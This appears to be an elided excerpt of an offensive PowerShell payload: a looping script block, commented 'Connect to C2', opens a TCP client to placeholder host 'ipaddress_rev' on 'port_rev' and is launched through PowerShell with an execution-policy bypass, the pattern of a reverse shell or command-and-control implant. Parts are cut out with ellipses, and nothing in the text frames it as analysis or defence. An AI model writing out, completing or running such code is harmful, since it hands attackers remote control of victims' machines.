...
$scriptBlock = {
  do {
    ...
    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('ipaddress_rev', port_rev)
    } catch {}
...
$process = Start-Process $powershellPath -ArgumentList ("-ExecutionPolicy Bypass -Interactive -noprofile " + $scriptBlock) -PassThru
